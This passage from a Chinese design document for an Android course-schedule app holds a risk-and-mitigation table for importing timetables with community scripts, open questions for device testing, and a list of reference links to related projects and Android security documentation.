| 风险 | 影响 | 缓解 |
|---|---|---|
| 学校改版无预警 | 导入失败 | 指纹 + 健康度 + 脚本热修（P3 前靠发版） |
| 社区脚本质量 | 脏数据进库 | 无网络桥 + 输出强校验 + 预览确认 + 变化预算 |
| ROM 杀后台 | 用户以为已同步 | 少用前台服务；展示「上次成功时间」；文案不承诺准点 |
| 远程源被墙 | 更新失败 | 多源 + 内置兜底；手动导入不受影响 |
| 灰度误伤 | 大面积失败 | 10%→50%→100% + 服务端一键 `status:broken` |

**待真机验证**：① minSdk 26 下 Ed25519 验证实现与性能；② ColorOS 上 `setDataDirectorySuffix` 多账号隔离；③ 离屏 WebView 在 WorkManager 中的存活率（预期极低）；④ 通用表格解析在「非 kbtable」页面的召回率。

---

## 10. 参考链接

- 拾光适配仓库（目录/索引约定、`index-pb-release`）：<https://github.com/ShiGuangSchedule/shiguang_warehouse>
- 拾光正方脚本（桥式契约样本）：<https://github.com/ShiGuangSchedule/shiguang_warehouse/blob/main/resources/zhengfang_jiaowu/zhengfang_01.js>
- 拾光 App 桥协议：<https://github.com/ShiGuangSchedule/shiguangschedule/blob/main/shared/src/commonMain/kotlin/com/xingheyuzhuan/shiguangschedule/ui/schoolselection/web/WebBridgeProtocol.kt>
- 拾光仓库更新（协议版本/单调版本）：<https://github.com/ShiGuangSchedule/shiguangschedule/blob/main/shared/src/commonMain/kotlin/com/xingheyuzhuan/shiguangschedule/tool/GitUpdater.kt>
- 拾光 WebView 兼容层（混合内容/证书反面参考）：<https://github.com/ShiGuangSchedule/shiguangschedule/blob/main/shared/src/androidMain/kotlin/com/xingheyuzhuan/shiguangschedule/ui/schoolselection/web/WebCompatDelegate.kt>
- 小米小爱课程表开发者文档（provider/parser/timer、版本态机）：<https://open-schedule-prod.ai.xiaomi.com/docs/#/help/>
- 下节啥课 parser 注册表：<https://github.com/baoozak/timetable/blob/main/utils/parsers/index.js>
- 下节啥课 parser 形态（provider 字符串内嵌）：<https://github.com/baoozak/timetable/blob/main/utils/parsers/zhengfang_new.js>
- 下节啥课学校目录：<https://github.com/baoozak/timetable/blob/main/utils/schools.json>
- 小爱/WakeUp 脚本合集（口令格式逆向样本）：<https://github.com/kqakqakqa/xiaoai-schedule-parser>
- ClassIsland Excel 导入窗口：<https://github.com/ClassIsland/ClassIsland/blob/master/ClassIsland/Views/ExcelImportWindow.xaml>
- ClassIsland 文档源码：<https://github.com/ClassIsland/classisland-docs-next>
- Android 动态代码加载（政策 + 完整性）：<https://developer.android.google.cn/privacy-and-security/risks/dynamic-code-loading>
- Android 14 行为变更（DCL 只读）：<https://developer.android.google.cn/about/versions/14/behavior-changes-14>
- Android 安全提示（WebView/JS 桥/凭据）：<https://developer.android.google.cn/privacy-and-security/security-tips>
- WorkManager 周期任务：<https://developer.android.google.cn/reference/androidx/work/PeriodicWorkRequest>
- minisign：<https://jedisct1.github.io/minisign/> ｜ RFC 8032：<https://www.rfc-editor.org/rfc/rfc8032>
- TUF（防回滚/防冻结）：<https://theupdateframework.github.io/specification/latest/>
- 本项目：`课程表APP技术方案.md`（4.6 导入 / 4.10 自动同步）→ [打开](../../课程表APP技术方案.md)
